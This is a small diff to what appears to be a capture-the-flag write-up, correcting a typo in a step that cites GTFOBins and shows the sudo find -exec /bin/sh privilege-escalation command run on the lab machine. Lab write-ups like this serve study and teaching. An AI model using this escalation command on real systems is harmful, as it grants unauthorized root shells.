@@ -511,7 +511,7 @@ c3p0@thehackernewsbdarija:~$
 
 https://gtfobins.github.io/gtfobins/find/
 
-We can escalte to root using ```sudo find . -exec /bin/sh \; -quit``` 
+We can escalate to root using ```sudo find . -exec /bin/sh \; -quit``` 
 
 ```bash
 c3p0@thehackernewsbdarija:~$ sudo /usr/bin/find . -exec /bin/sh \; -quit
